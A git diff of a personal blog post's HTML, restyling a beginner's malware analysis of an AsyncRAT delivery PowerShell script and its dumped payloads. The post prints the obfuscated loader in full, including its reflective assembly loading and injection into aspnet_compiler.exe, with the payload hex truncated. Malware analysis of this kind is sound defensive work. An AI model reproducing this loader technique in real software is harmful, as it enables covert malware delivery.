@@ -1,594 +1,457 @@
 <!DOCTYPE html>
-<header>
+<head>
 	<title>zxcyq.re</title>
 	<link rel="stylesheet" href="/assets/style.css" type="text/css" />
-</header>
-<body>
-<html>
-
+</head>
 <body>
 
-	<nav><a href="/index.html" style="float:left">zxcyq;re</a></nav>
+	<header>
+		<nav class="blogNav">
+			<div class="blogNavContainer">
+				<ul>
+					<li class="headerLi headerLiCore"><a href="/index.html" class="headerACore"><div class="navLinkContent">zxcyq;re</div></a></li>
+					<li class="headerLi" ><a href="/blog.html" class="headerACore"><div class="navLinkContent">blog</div></a></li>
+				</ul>
+			</div>
+		</nav>
+	</header>
+	<div class="blogWrapper heightpercent">
+
+	<main>
+
+		<div class="blogTitle">
+			<h1>PowerShell Analysis - Dump AsyncRAT</h1>
+
+			<div class="blogDescription">Analysis of an AsyncRAT delivery PowerShell script.</div>
+			<div class="blogDatePublished">August 1, 2024</div>
+		</div>
+
+		<div class="blogContainer">
+			<article>
+
+				<div class="section-spacing-first-top-blog-post"></div>
+				<p>I learn as I go along.</p>
+
+				<p>This is my first blog post, and my PowerShell skills are more like WeakShell.</p>
+
+				<div class="hr section-spacing-top"></div>
+				<h2># init</h2>
+
+				<p>AsyncRAT sample: https://bazaar.abuse.ch/sample/8dba2ac1f543d24b14ca1fdf0e1e2d8333c5cc669f78afc905d512aed21e6b2f/</p>
+
+				<p>This is an old sample, that was uploaded to bazaar and virustotal on October 2023. This is the first AsyncRAT sample I've ever analysed.</p>
+
+				<img src="/assets/imgs/1/1.png" width="70%" class="displayFull" />
 
 
-	<br />
-	<h1># init</h1>
+				<p>On remnux, unzipping the file.</p>
 
-	<p>The purpose of this post is documenting the analysis of an AsyncRAT delivery PowerShell script.</p>
-
-	<p>I learn as I go along.</p>
-
-	<p>This is my first blog post, and my PowerShell skills are more like WeakShell.</p>
+				<img src="/assets/imgs/1/2.png" width="60%" class="displayFull" />
 
 
-	<br />
-	<p>AsyncRAT sample: https://bazaar.abuse.ch/sample/8dba2ac1f543d24b14ca1fdf0e1e2d8333c5cc669f78afc905d512aed21e6b2f/</p>
+				<p>A search for the file's hash or the string <code>#mY cODER 3LOSH RAT ::::::</code> might reveal more information about the malware, however I'm going to skip this here.</p>
 
-	<p>This is an old sample, that was uploaded to bazaar and virustotal on October 2023. This is the first AsyncRAT sample I've ever analysed.</p>
+				<img src="/assets/imgs/1/3.png" width="40%" class="displayFull" />
 
-	<img src="/assets/imgs/1/1.png" width="70%" />
-
-
-	<br />
-	<br />
-	<p>On remnux, unzipping the file.</p>
-
-	<img src="/assets/imgs/1/2.png" width="60%" />
+				<p>This is what the script looks like.</p>
+				<img src="/assets/imgs/1/4.png" width="90%" class="displayFull" />
+				<br />
+				<img src="/assets/imgs/1/5.png" width="90%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>A search for the file's hash or the string <code>#mY cODER 3LOSH RAT ::::::</code> might reveal more information about the malware, however I'm going to skip this here.</p>
+				<p>Big picture; there are two functions, followed by a huge chunk of text, followed by transformation steps followed by some running method.</p>
+				<p>Taking a closer look, shows that the "huge chunk of text" is actually two variables, that transformations run against.</p>
 
-	<img src="/assets/imgs/1/3.png" width="40%" />
-
-	<br />
-	<br />
-	<p>This is what the script looks like.</p>
-	<img src="/assets/imgs/1/4.png" width="90%" />
-	<img src="/assets/imgs/1/5.png" width="90%" />
+				<img src="/assets/imgs/1/6.png" width="90%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>Big picture; there are two functions, followed by a huge chunk of text, followed by transformation steps followed by some running method.</p>
-	<p>Taking a closer look, shows that the "huge chunk of text" is actually two variables, that transformations run against.</p>
-
-	<img src="/assets/imgs/1/6.png" width="90%" />
+				<p>Number of lines</p>
+				<img src="/assets/imgs/1/7.png" width="50%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>Number of lines</p>
-	<img src="/assets/imgs/1/7.png" width="50%" />
+				<p>Number of characters</p>
+				<img src="/assets/imgs/1/8.png" width="50%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>Number of characters</p>
-	<img src="/assets/imgs/1/8.png" width="50%" />
+				<p>Script contents</p>
+				<code style="tab-size:2em"><pre>
+		#mY cODER 3LOSH RAT ::::::
 
-	<br />
-	<br />
-	<br />
-	<br />
-	<code><pre>
-	#mY cODER 3LOSH RAT ::::::
+		Function HzGaJsAt([String] $JJES367) {
+				$HHHHWQW4 = [System.Collections.Generic.List[Byte]]::new()
+				for ($i = 0; $i -lt $JJES367.Length; $i +=8) {
+						$HHHHWQW4.Add([Convert]::ToByte($JJES367.Substring($i, 8), 2))
+				}
+				return [System.Text.Encoding]::ASCII.GetString($HHHHWQW4.ToArray())
+		}
 
-	Function HzGaJsAt([String] $JJES367) {
-			$HHHHWQW4 = [System.Collections.Generic.List[Byte]]::new()
-			for ($i = 0; $i -lt $JJES367.Length; $i +=8) {
-					$HHHHWQW4.Add([Convert]::ToByte($JJES367.Substring($i, 8), 2))
-			}
-			return [System.Text.Encoding]::ASCII.GetString($HHHHWQW4.ToArray())
-	}
-
-	function ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV {
-			param($Alosh)
-			$Alosh = $Alosh -split '(..)' | ? { $_ }
-			ForEach ($JSEYHESSS325 in $Alosh){
-					[Convert]::ToInt32($JSEYHESSS325,16)
-			}
-	}
+		function ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV {
+				param($Alosh)
+				$Alosh = $Alosh -split '(..)' | ? { $_ }
+				ForEach ($JSEYHESSS325 in $Alosh){
+						[Convert]::ToInt32($JSEYHESSS325,16)
+				}
+		}
 
 
-	$aloooooooo = '4D5@9%%%%3%%%%%%%4%%%%%%FFFF%%%%B8%%%%%%%%%%%%%%4%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%8%%%%%%%%E!FB@%E%%B4%9CD2!B8%!4CCD2!546869732%7%726F67726!6D2%636!6E6E6F742%62652%72756E2%696E2%444F532%6D6F64652E%D%D%@24%%%%%%%%%%%%%%5%45%%%%4C%!%3%%766@7@64%%%%%%%%%%%%%%%%E%%%%2%!%B%!%8%%%%FC%%%%%%%@%%%%%%%%%%%%3E!@%!%%%%2%%%%%%%2%%!%%%%%%4%%%%%2%%%%%%%%2%%%%%4%%%%%%%%%%%%%%%4%%%%%%%%%%%%%%%%6%%!%%%%%2%%%%%%%%%%%%%2%%6%85%%%%!%%%%%!%%%%%%%%%!%%%%%!%%%%%%%%%%%%%!%%%%%%%%%%%%%%%%%%%%%%%EC!9%!%%4F%%%%%%%%2%%!%%FF%7%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%4%%!%%%C%%%%%%%%%%%%%%%%%%%%%%...'.Replace("%","0").Replace("!","1").Replace("@","A")
-	$geGWHZ = '4D5@9OOOO3OOOOOOO4OOOOOOFFF...'.Replace("O","0").Replace("!","1").Replace("@","A")
+		$aloooooooo = '4D5@9%%%%3%%%%%%%4%%%%%%FFFF%%%%B8...'.Replace("%","0").Replace("!","1").Replace("@","A")
+		$geGWHZ = '4D5@9OOOO3OOOOOOO4OOOOOOFFF...'.Replace("O","0").Replace("!","1").Replace("@","A")
 
 
-	 try 
-	{
+		 try 
+		{
+			[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
+				[byte[]]$JESTW3ERH2 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $geGWHZ
+
+			$SJEWS4 = (HzGaJsAt("*1***1*1*1111****11**1*1*11***11*111*1*1*111*1***11**1*1".Replace('*','0')))
+			$JDRU32 = (HzGaJsAt("0*00*00*0**0***00***0**00**0****0**0*0**0**00*0*".Replace('*','1')))
+			$JSEEESWR  = 'C:\Wi**nd**ows\Mi**cro**soft.NET\Frame**work\v4.0.30319\asp**net_com**pi**ler.**e**x**e'
+			
+		 try 
+		{
+		$JRES3E5 = [System.Reflection.Assembly]
+			$ncrx3 = $JRES3E5::Load(($JESTW3ERH2))
+			} catch { }
+
+			 try 
+		{
+			$EUS3W3 = $ncrx3.GetType('N' +'e' +'wP' +'E.PE');
+			$EUZW = $EUS3W3.'GetMethod'($SJEWS4);
+			} catch { }
+
+
+			 try 
+		{
+
+		$HYYAW42 = $JSEEESWR.Replace("**", "")
+
+		$SEYEYHHSSSSSSW = [object[]]($HYYAW42, $UUSW23)
+
+
+		$EUZW.$JDRU32.Invoke($null, $SEYEYHHSSSSSSW)
+
+		} catch { }
+		 } catch { }
+				</pre>
+				</code>
+
+				Notable:
+				<ul>
+				<li><code>Invoke()</code></li>
+				<li><code>asp**net_com**pi**ler.**e**x**e</code> - [aspnet_compiler.exe](https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/)</li>
+				<li>Calling <code>Replace("@","A")</code> against both <code>$aloooooooo</code> and <code>$geGWHZ</code>, transforms the string <code>4D5@</code> into <code>4D5A</code>, the magic number for a DOS header, indicative of a PE file.</li>
+				</ul>
+
+
+				<p>One could here analyse this using automated means, like *PSDecode or X*, or debug and analyse this manually.</p>
+
+				<p>For manual analysis, PowerShell ISE is great.</p>
+
+
+				<div class="hr section-spacing-top"></div>
+				<h2># debug via PowerShell ISE</h2>
+
+				<img src="/assets/imgs/1/9.png" width="100%" class="displayFull" />
+
+
+				<p>The idea is to place breakpoints and run it line by line.</p>
+
+				<p>Printing out the first variable:</p>
+
+				<img src="/assets/imgs/1/10.png" width="55%" class="displayFull" />
+
+
+				<p>The first chunk of code basically calls <code>ToInt32()</code> against chunks of the statically defined variables, post initial <code>Replace()</code> transformations.</p>
+
+				<code style="tab-size:2em">
+				<pre>
+		function ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV {
+				param($Alosh)
+				$Alosh = $Alosh -split '(..)' | ? { $_ }
+				ForEach ($JSEYHESSS325 in $Alosh){
+						[Convert]::ToInt32($JSEYHESSS325,16)
+				}
+		}
+
 		[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
-			[byte[]]$JESTW3ERH2 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $geGWHZ
+		[byte[]]$JESTW3ERH2 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $geGWHZ
+				</pre>
+				</code>
 
+				<img src="/assets/imgs/1/11.png" width="60%" class="displayFull" />
+
+				<img src="/assets/imgs/1/12.png" width="60%" class="displayFull" />
+
+				<p>This produces two byte arrays.</p>
+				<img src="/assets/imgs/1/13.png" width="15%" style="margin-left:22%" />
+
+				<img src="/assets/imgs/1/14.png" width="40%" style="margin-right:22%" />
+
+
+				<p>Next up the PowerShell, calls replace against two static bit strings before calling <code>HzGaJsAt()</code> against them.</p>
+
+				<code style="tab-size:2em">
+				<pre>
 		$SJEWS4 = (HzGaJsAt("*1***1*1*1111****11**1*1*11***11*111*1*1*111*1***11**1*1".Replace('*','0')))
 		$JDRU32 = (HzGaJsAt("0*00*00*0**0***00***0**00**0****0**0*0**0**00*0*".Replace('*','1')))
-		$JSEEESWR  = 'C:\Wi**nd**ows\Mi**cro**soft.NET\Frame**work\v4.0.30319\asp**net_com**pi**ler.**e**x**e'
-		
-	 try 
-	{
-	$JRES3E5 = [System.Reflection.Assembly]
-		$ncrx3 = $JRES3E5::Load(($JESTW3ERH2))
-		} catch { }
+				</pre>
+				</code>
 
+
+				<p>This, iterates over 8 digit chunks, converts them to bytes, and places them on a list, which is eventually converted to a string and returned.</p>
+
+				<img src="/assets/imgs/1/15.png" width="40%" class="displayFull" />
+
+
+				<p>The fun of debugging.</p>
+				<img src="/assets/imgs/1/16.png" width="50%" class="displayFull" />
+
+
+				<p>As the function doesn't maintain state anywhere, one can run it to get the return value.</p>
+				<img src="/assets/imgs/1/17.png" width="60%" class="displayFull" />
+
+
+				<p>So, it returned invoke and execute.</p>
+				<img src="/assets/imgs/1/18.png" width="30%" class="displayFull" />
+				<br />
+				<img src="/assets/imgs/1/19.png" width="90%" class="displayFull" />
+
+				<br />
+				<p>The next try catch statement, sets up PowerShell object <code>System.Reflection.Assembly</code> ([1](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-8.0)) in <code>$JRES3E5</code> and loads the second variable's byte array into <code>$ncrx3</code>. It seems like this is a .NET payload.</p>
+
+				<p>From <a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/reflection/reflection">MS Docs on Reflection</a></p>
+				<blockquote>
+				The classes in the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.reflection">System.Reflection</a> namespace, together with <a href="https://learn.microsoft.com/en-us/dotnet/api/system.type">System.Type</a>, enable you to obtain information about loaded <a href="https://learn.microsoft.com/en-us/dotnet/standard/assembly/">assemblies</a> and the types defined within them, such as <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#classes">classes</a>, <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#interfaces">interfaces</a>, and value types (that is, <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#structures">structures</a> and <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#enumerations">enumerations</a>). You can also use reflection to create type instances at run time, and to invoke and access them.
+				</blockquote>
+
+
+				<code style="tab-size:2em">
+				 <pre>
 		 try 
-	{
-		$EUS3W3 = $ncrx3.GetType('N' +'e' +'wP' +'E.PE');
-		$EUZW = $EUS3W3.'GetMethod'($SJEWS4);
-		} catch { }
+		{
+		$JRES3E5 = [System.Reflection.Assembly]
+			$ncrx3 = $JRES3E5::Load(($JESTW3ERH2))
+			} catch { }
 
+			 try 
+		{
+			$EUS3W3 = $ncrx3.GetType('N' +'e' +'wP' +'E.PE');
+			$EUZW = $EUS3W3.'GetMethod'($SJEWS4);
+			} catch { }
+				</pre>
+				</code>
 
-		 try 
-	{
 
-	$HYYAW42 = $JSEEESWR.Replace("**", "")
+				<img src="/assets/imgs/1/20.png" width="25%" style="margin-left:4%" />
+				<img src="/assets/imgs/1/21.png" width="25%" />
+				<img src="/assets/imgs/1/22.png" width="40%" style="margin-right:4%"/>
+				<br />
+				<img src="/assets/imgs/1/23.png" width="50%" class="displayFull" />
+				<br />
+				<img src="/assets/imgs/1/24.png" width="50%" class="displayFull" />
+				<br />
+				<img src="/assets/imgs/1/25.png" width="95%" class="displayFull" />
 
-	$SEYEYHHSSSSSSW = [object[]]($HYYAW42, $UUSW23)
+				<br />
+				<p>Interesting. Seems like this is either a modified Avast .NET binary or is named to seem like one.</p>
 
 
-	$EUZW.$JDRU32.Invoke($null, $SEYEYHHSSSSSSW)
+				<p>The <code>$ncrx3.GetType('NewPE.PE')</code> call returns an object.</p>
+				<img src="/assets/imgs/1/26.png" width="45%" style="margin-left:5%" />
 
-	} catch { }
-	 } catch { }
-	</pre>
-	</code>
-	<br />
-	<br />
+				<img src="/assets/imgs/1/27.png" width="43%" style="margin-right:5%" />
 
-	<br />
-	Notable:
-	<ul>
-	<li><code>Invoke()</code></li>
-	<li><code>asp**net_com**pi**ler.**e**x**e</code> - [aspnet_compiler.exe](https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/)</li>
-	<li>Calling <code>Replace("@","A")</code> against both <code>$aloooooooo</code> and <code>$geGWHZ</code>, transforms the string <code>4D5@</code> into <code>4D5A</code>, the magic number for a DOS header, indicative of a PE file.</li>
-	</ul>
 
+				<p>This object allows access to the Image itself (but, I don't know too much about .NET, so take this with a grain of salt).</p>
+				<p>One could for example access its methods as below.</p>
 
-	<br />
-	<br />
-	<p>One could here analyse this using automated means, like *PSDecode or X*, or debug and analyse this manually.</p>
+				<code style="tab-size:2em">
+				<pre>
+		$ncrx3.GetType('NewPE.PE').GetMethods()
+				</pre>
+				</code>
 
-	<p>For manual analysis, PowerShell ISE is great.</p>
 
-	<br />
-	<br />
-	<h1># debug via PowerShell ISE</h1>
+				<p>The PowerShell here just obtains a handle to the object's <code>Execute</code> method.</p>
 
-	<img src="/assets/imgs/1/9.png" width="100%" />
+				<code style="tab-size:2em">
+				<pre>
+		$EUZW = $EUS3W3.'GetMethod'('Execute')
+				</pre>
+				</code>
 
 
-	<br />
-	<br />
-	<p>The idea is to place breakpoints and run it line by line.</p>
+				<p>The assembly's <code>Execute</code> method:</p>
+				<img src="/assets/imgs/1/28.png" width="30%" style="margin-left:18%" />
 
-	<p>Printing out the first variable:</p>
+				<img src="/assets/imgs/1/29.png" width="30%" style="margin-right:18%" />
 
-	<img src="/assets/imgs/1/10.png" width="55%" />
+				<p>The last part of the script is the below try catch statement.</p>
 
+				<img src="/assets/imgs/1/30.png" width="25%" class="displayFull" />
 
-	<br />
-	<br />
-	<p>The first chunk of code basically calls <code>ToInt32()</code> against chunks of the statically defined variables, post initial <code>Replace()</code> transformations.</p>
 
-	<code>
-	<pre>
-	function ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV {
-			param($Alosh)
-			$Alosh = $Alosh -split '(..)' | ? { $_ }
-			ForEach ($JSEYHESSS325 in $Alosh){
-					[Convert]::ToInt32($JSEYHESSS325,16)
-			}
-	}
+				<p>Hovering over the object allows one to see what the object contains.</p>
+				<p>We know that variable <code>$HYYAW42</code> contains the full path of <code>aspnet_compiler.exe</code>.</p>
 
-	[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
-	[byte[]]$JESTW3ERH2 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $geGWHZ
-	</pre>
-	</code>
-	<br />
-	<br />
+				<img src="/assets/imgs/1/31.png" width="50%" class="displayFull" />
 
-	<img src="/assets/imgs/1/11.png" width="60%" />
+				<img src="/assets/imgs/1/32.png" width="60%" class="displayFull" />
 
-	<img src="/assets/imgs/1/12.png" width="60%" />
 
-	<br />
-	<br />
-	<br />
-	<p>This produces two byte arrays.</p>
-	<img src="/assets/imgs/1/13.png" width="15%" />
+				<p>Variable <code>$UUSW23</code> contains a sequence of bytes that was populated on line 26. It's essentially what was in the first variable.</p>
 
-	<img src="/assets/imgs/1/14.png" width="40%" />
+				<code style="tab-size:2em">
+				<pre>
+		[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
+				</pre>
+				</code>
 
 
+				<p>Variable <code>$EUZW</code> is a handle to the assembly's Execute method and has the property Invoke, which is also what <code>$JDRU32</code> is.</p>
+				<img src="/assets/imgs/1/33.png" width="25%" style="margin-left:25%" />
 
-	<br />
-	<br />
-	<p>Next up the PowerShell, calls replace against two static bit strings before calling <code>HzGaJsAt()</code> against them.</p>
+				<img src="/assets/imgs/1/34.png" width="20%" style="margin-right:25%" />
 
-	<code>
-	<pre>
-	$SJEWS4 = (HzGaJsAt("*1***1*1*1111****11**1*1*11***11*111*1*1*111*1***11**1*1".Replace('*','0')))
-	$JDRU32 = (HzGaJsAt("0*00*00*0**0***00***0**00**0****0**0*0**0**00*0*".Replace('*','1')))
-	</pre>
-	</code>
+				<img src="/assets/imgs/1/35.png" width="90%" class="displayFull" />
 
 
-	<br />
-	<p>This, iterates over 8 digit chunks, converts them to bytes, and places them on a list, which is eventually converted to a string and returned.</p>
 
-	<img src="/assets/imgs/1/15.png" width="40%" />
+				<p>Again, the last block:</p>
+				<img src="/assets/imgs/1/36.png" width="25%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>The fun of debugging.</p>
-	<img src="/assets/imgs/1/16.png" width="50%" />
+				<p>Essentially we can see that the PowerShell <code>(Assembly's).Execute().Invoke().Invoke(NULL, (aspnet_compiler.exe byteArray[]) )</code> is what will be ran.</p>
 
 
-	<br />
-	<br />
-	<p>As the function doesn't maintain state anywhere, one can run it to get the return value.</p>
-	<img src="/assets/imgs/1/17.png" width="60%" />
+				<code style="tab-size:2em">
+				<pre>
+		$EUZW.$JDRU32.Invoke($null, $SEYEYHHSSSSSSW)
+				</pre>
+				</code>
 
 
-	<br />
-	<br />
-	<p>So, it returned invoke and execute.</p>
-	<img src="/assets/imgs/1/18.png" width="30%" />
+				<p>The script will execute the contents of <code>$SEYEYHHSSSSSSW</code>, which is the full path to <code>aspnet_compiler.exe</code> along with the byte array set up earlier, as parameter.</p>
 
-	<br />
-	<img src="/assets/imgs/1/19.png" width="90%" />
+				<img src="/assets/imgs/1/37.png" width="50%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<p>The next try catch statement, sets up PowerShell object <code>System.Reflection.Assembly</code> ([1](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-8.0)) in <code>$JRES3E5</code> and loads the second variable's byte array into <code>$ncrx3</code>. It seems like this is a .NET payload.</p>
+				<p>The byte array, is the actual payload it wants to run.</p>
 
-	<p>From <a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/reflection/reflection">MS Docs on Reflection</a></p>
-	<blockquote>
-	The classes in the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.reflection">System.Reflection</a> namespace, together with <a href="https://learn.microsoft.com/en-us/dotnet/api/system.type">System.Type</a>, enable you to obtain information about loaded <a href="https://learn.microsoft.com/en-us/dotnet/standard/assembly/">assemblies</a> and the types defined within them, such as <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#classes">classes</a>, <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#interfaces">interfaces</a>, and value types (that is, <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#structures">structures</a> and <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/common-type-system#enumerations">enumerations</a>). You can also use reflection to create type instances at run time, and to invoke and access them.
-	</blockquote>
+				<p>Using cmdlet <code>Set-Content</code> one can dump it to disk.</p>
 
+				<img src="/assets/imgs/1/38.png" width="90%" class="displayFull" />
 
-	<br />
-	<code>
-	 <pre>
-	 try 
-	{
-	$JRES3E5 = [System.Reflection.Assembly]
-		$ncrx3 = $JRES3E5::Load(($JESTW3ERH2))
-		} catch { }
+				<img src="/assets/imgs/1/39.png" width="45%" class="displayFull" />
 
-		 try 
-	{
-		$EUS3W3 = $ncrx3.GetType('N' +'e' +'wP' +'E.PE');
-		$EUZW = $EUS3W3.'GetMethod'($SJEWS4);
-		} catch { }
-	</pre>
-	</code>
-	<br />
-	<br />
 
+				<p>Dumping this to a file results in Defender flagging it.</p>
+				<img src="/assets/imgs/1/40.png" width="25%" class="displayFull" />
 
-	<img src="/assets/imgs/1/20.png" width="25%" />
-	<br />
-	<br />
-	<img src="/assets/imgs/1/21.png" width="25%" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/22.png" width="45%" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/23.png" width="50%" />
+				<p>There was also another image, the one that is eventually loaded into <code>$ncrx3</code> and eventually <code>$EUZW</code>.</p>
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/24.png" width="50%" />
+				<img src="/assets/imgs/1/41.png" width="90%" class="displayFull" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/25.png" width="95%" />
 
+				<p>Dumping that one as well.</p>
+				<img src="/assets/imgs/1/42.png" width="40%" style="margin-left:14%" />
 
-	<br />
-	<br />
-	<p>Interesting. Seems like this is either a modified Avast .NET binary or is named to seem like one.</p>
+				<img src="/assets/imgs/1/43.png" width="30%" style="margin-right:14%" />
 
 
-	<br />
-	<p>The <code>$ncrx3.GetType('NewPE.PE')</code> call returns an object.</p>
-	<img src="/assets/imgs/1/26.png" width="45%" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/27.png" width="50%" />
+				<div class="hr section-spacing-top"></div>
+				<h2># Taking a quick look at <code>avast.dll.bin</code></h2>
 
+				<p>I searched online for the hash and found the file on VirusTotal.</p>
+				https://www.virustotal.com/gui/file/9e3b980a2d5989265088ac01bc076fe5e06cf845d05d1d0e7ea053af5f7481c7/details
 
-	<br />
-	<br />
-	<br />
-	<p>This object allows access to the Image itself (but, I don't know too much about .NET, so take this with a grain of salt).</p>
-	<p>One could for example access its methods as below.</p>
+				<p>Dropped the file on PE-bear.</p>
 
-	<br />
-	<code>
-	<pre>
-	$ncrx3.GetType('NewPE.PE').GetMethods()
-	</pre>
-	</code>
+				<img src="/assets/imgs/1/44.png" width="70%" class="displayFull" />
 
 
-	<br />
-	<p>The PowerShell here just obtains a handle to the object's <code>Execute</code> method.</p>
+				<p>Funny compilation date</p>
+				<img src="/assets/imgs/1/45.png" width="70%" class="displayFull" />
 
-	<code>
-	<pre>
-	$EUZW = $EUS3W3.'GetMethod'('Execute')
-	</pre>
-	</code>
 
+				Notable strings:
+				<ul>
+				<li><code>microstub</code> and</li>
+				<li><code>NewPE.dll</code></li>
+				</ul>
+				<img src="/assets/imgs/1/46.png" width="70%" class="displayFull" />
 
-	<br />
-	<p>The assembly's <code>Execute</code> method:</p>
-	<img src="/assets/imgs/1/28.png" width="30%" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/29.png" width="35%" />
+				<div class="hr section-spacing-top"></div>
+				<h2># Taking a quick look at <code>dumped.bin</code></h2>
 
-	<br />
-	<br />
-	<p>The last part of the script is the below try catch statement.</p>
 
-	<img src="/assets/imgs/1/30.png" width="25%" />
+				I searched for the hash online and found these two links:
+				<ul>
+				<li>60 / 73 hits on VirusTotal - https://www.virustotal.com/gui/file/9c4382baca1a31a12c7e60bf324113f763e3d4e813ee518638a6f6f85aac3c70</li>
+				<li>AsyncRAT from 9 months ago - https://bazaar.abuse.ch/sample/9c4382baca1a31a12c7e60bf324113f763e3d4e813ee518638a6f6f85aac3c70/</li>
+				</ul>
 
 
-	<br />
-	<br />
-	<p>Hovering over the object allows one to see what the object contains.</p>
-	<p>We know that variable <code>$HYYAW42</code> contains the full path of <code>aspnet_compiler.exe</code>.</p>
+				<p>Dropped it on PE-bear. It's a valid PE.</p>
 
-	<br />
-	<img src="/assets/imgs/1/31.png" width="50%" />
+				<img src="/assets/imgs/1/47.png" width="60%" class="displayFull" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/32.png" width="60%" />
 
+				<p>Possible compilation date.</p>
+				<img src="/assets/imgs/1/48.png" width="40%" class="displayFull" />
 
-	<br />
-	<br />
-	<br />
-	<p>Variable <code>$UUSW23</code> contains a sequence of bytes that was populated on line 26. It's essentially what was in the first variable.</p>
 
-	<br />
-	<code>
-	<pre>
-	[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
-	</pre>
-	</code>
+				<p>Imports.</p>
 
+				<img src="/assets/imgs/1/49.png" width="50%" class="displayFull" />
 
-	<br />
-	<p>Variable <code>$EUZW</code> is a handle to the assembly's Execute method and has the property Invoke, which is also what <code>$JDRU32</code> is.</p>
-	<img src="/assets/imgs/1/33.png" width="25%" />
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/34.png" width="20%" />
+				<p>Strings might reveal more information.</p>
 
-	<br />
-	<br />
-	<img src="/assets/imgs/1/35.png" width="90%" />
+				<p>Possible persistence via scheduled task and run key.</p>
 
+				<img src="/assets/imgs/1/50.png" width="60%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<br />
-	<p>Again, the last block:</p>
-	<img src="/assets/imgs/1/36.png" width="25%" />
+				<p>Anti Debugging checks</p>
+				<p><code>SbieDll.dll</code> is a known DLL used by Sandboxie.</p>
+				<img src="/assets/imgs/1/51.png" width="60%" class="displayFull" />
 
 
-	<br />
-	<br />
-	<br />
-	<p>Essentially we can see that the PowerShell <code>(Assembly's).Execute().Invoke().Invoke(NULL, (aspnet_compiler.exe byteArray[]) )</code> is what will be ran.</p>
+				<p>Crypto wallet checks in browser data.</p>
+				<p>Also seems to be looking for specific browser extensions.</p>
 
+				<img src="/assets/imgs/1/52.png" width="70%" style="margin-left:6%" />
+				<img src="/assets/imgs/1/53.png" width="15%" style="margin-right:6%" />
 
-	<br />
-	<code>
-	<pre>
-	$EUZW.$JDRU32.Invoke($null, $SEYEYHHSSSSSSW)
-	</pre>
-	</code>
 
+				<p>Discord tokens / Anydesk?</p>
+				<p>Also, can potentially kill processes using taskkill.</p>
 
-	<br />
-	<p>The script will execute the contents of <code>$SEYEYHHSSSSSSW</code>, which is the full path to <code>aspnet_compiler.exe</code> along with the byte array set up earlier, as parameter.</p>
+				<img src="/assets/imgs/1/54.png" width="8%" style="margin-left:38%" />
 
-	<img src="/assets/imgs/1/37.png" width="50%" />
 
+				<img src="/assets/imgs/1/55.png" width="12%" style="margin-right:38%" />
 
-	<br />
-	<br />
-	<p>The byte array, is the actual payload it wants to run.</p>
 
-	<p>Using cmdlet <code>Set-Content</code> one can dump it to disk.</p>
+				<p><code>Stub.exe</code>; note that the internal name of the dumped "Avast" dll was <code>microstub</code>.</p>
 
-	<img src="/assets/imgs/1/38.png" width="90%" />
+				<img src="/assets/imgs/1/56.png" width="70%" class="displayFull" />
 
-	<br />
-	<br />
-	<br />
-	<img src="/assets/imgs/1/39.png" width="45%" />
 
-
-	<br />
-	<br />
-	<br />
-	<p>Dumping this to a file results in Defender flagging it.</p>
-	<img src="/assets/imgs/1/40.png" width="25%" />
-
-
-
-	<br />
-	<br />
-	<p>There was also another image, the one that is eventually loaded into <code>$ncrx3</code> and eventually <code>$EUZW</code>.</p>
-
-	<img src="/assets/imgs/1/41.png" width="90%" />
-
-
-	<br />
-	<br />
-	<br />
-	<p>Dumping that one as well.</p>
-	<img src="/assets/imgs/1/42.png" width="40%" />
-
-	<br />
-	<br />
-	<img src="/assets/imgs/1/43.png" width="30%" />
-
-
-	<br />
-	<br />
-	<br />
-	<h1># Taking a quick look at <code>avast.dll.bin</code></h1>
-
-	<p>I searched online for the hash and found the file on VirusTotal.</p>
